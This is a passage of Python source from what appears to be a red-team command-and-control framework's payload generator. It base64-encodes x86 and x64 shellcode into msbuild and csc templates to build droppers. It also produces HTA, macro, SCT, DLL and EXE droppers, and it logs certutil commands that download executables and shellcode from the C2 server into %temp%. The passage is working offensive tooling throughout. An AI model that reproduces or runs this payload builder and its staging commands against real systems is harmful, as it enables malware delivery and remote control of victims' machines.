            x86base64 = open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb").read()
            x86base64 = base64.b64encode(x86base64)
            x64base64 = open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb").read()
            x64base64 = base64.b64encode(x64base64)
            payloadname = "PBindSharp_v4"

        msbuild = open("%smsbuild.xml" % (PayloadTemplatesDirectory), 'r').read()
        msbuild = str(msbuild) \
            .replace("#REPLACEME32#", x86base64.decode('UTF-8')) \
            .replace("#REPLACEME64#", x64base64.decode('UTF-8')) \
            .replace("#REPLACEMERANDSTRING#", str(randomuri()))

        output_file = open("%s%s%s_msbuild.xml" % (self.BaseDirectory, name, payloadname), 'w')
        output_file.write(msbuild)
        output_file.close()

    def CreateCSCFiles(self, payloadtype, name=""):
        self.QuickstartLog("Payload written to: %s%s%s_csc.cs" % (self.BaseDirectory, name, payloadtype))
        
        if payloadtype == PayloadType.Posh_v2:
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x86_Shellcode.bin"), "rb") as b86:
                x86base64 = base64.b64encode(b86.read())
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x64_Shellcode.bin"), "rb") as b64:
                x64base64 = base64.b64encode(b64.read())
            payloadname = "Posh_v2"

        elif payloadtype == PayloadType.Posh_v4:
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x86_Shellcode.bin"), "rb") as b86:
                x86base64 = base64.b64encode(b86.read())
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x64_Shellcode.bin"), "rb") as b64:
                x64base64 = base64.b64encode(b64.read())
            payloadname = "Posh_v4"

        elif payloadtype == PayloadType.Sharp:
            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x86_Shellcode.bin"), "rb") as b86:
                x86base64 = base64.b64encode(b86.read())
            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x64_Shellcode.bin"), "rb") as b64:
                x64base64 = base64.b64encode(b64.read())
            payloadname = "Sharp_v4"

        elif payloadtype == PayloadType.PBind:
            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x86_Shellcode.bin"), "rb") as b86:
                x86base64 = base64.b64encode(b86.read())
            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x64_Shellcode.bin"), "rb") as b64:
                x64base64 = base64.b64encode(b64.read())
            payloadname = "PBind_v4"

        elif payloadtype == PayloadType.PBindSharp:
            with open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb") as b86:
                x86base64 = base64.b64encode(b86.read())
            with open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb") as b64:
                x64base64 = base64.b64encode(b64.read())
            payloadname = "PBindSharp_v4"

        content = open("%scsc.cs" % (PayloadTemplatesDirectory), 'r').read()
        content = str(content) \
            .replace("#REPLACEME32#", x86base64.decode('UTF-8')) \
            .replace("#REPLACEME64#", x64base64.decode('UTF-8')) \
            .replace("#REPLACEMERANDSTRING#", str(randomuri()))

        output_file = open("%s%s%s_csc.cs" % (self.BaseDirectory, name, payloadname), 'w')
        output_file.write(content)
        output_file.close()


    def CreateDynamicCodeTemplate(self, name=""):
        with open(f"{PayloadTemplatesDirectory}DynamicCode.cs", "r") as template:
            with open(f"{self.BaseDirectory}DynamicCode.cs", "w") as payload:
                payload.write(template.read())


    def CreateAll(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog(Colours.END + "Payloads/droppers using powershell.exe:" + Colours.END)
        self.QuickstartLog(Colours.END + "=======================================" + Colours.END)
        self.CreateRaw(name)
        self.CreateHTA(name)
        self.CreateMacro(name)    
        self.CreateSCT(name)
        
        self.QuickstartLog(Colours.END)
        self.QuickstartLog(Colours.END + "Payloads/droppers using shellcode:" + Colours.END)
        self.QuickstartLog(Colours.END + "==================================" + Colours.END)
        self.CreateDroppers(name)
        self.CreateCS(name) 
        self.CreateDlls(name)  
        self.CreateShellcode(name)
        self.CreateDotNet2JS(name)
        self.CreateEXE(name)
        self.CreateMsbuild(name)
        self.CreateCsc(name)
        self.CreatePython(name)
        self.CreateDynamicCodeTemplate(name)

        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Download Posh64 & Posh32 executables using certutil:" + Colours.GREEN)
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (f"{self.FirstURL}/{self.QuickCommand}_ex86", randomuri()))
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (f"{self.FirstURL}/{self.QuickCommand}_ex64", randomuri()))
        
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Download Posh/Sharp x86 and x64 shellcode from the webserver:" + Colours.GREEN)
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (f"{self.FirstURL}/{self.QuickCommand}s/64/portal", randomuri()))
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (f"{self.FirstURL}/{self.QuickCommand}s/86/portal", randomuri()))
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (f"{self.FirstURL}/{self.QuickCommand}p/64/portal", randomuri()))
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (f"{self.FirstURL}/{self.QuickCommand}p/86/portal", randomuri()))

        self.QuickstartLog(Colours.END)
        self.QuickstartLog(f"pbind-connect hostname {self.PBindPipeName} {self.PBindSecret}")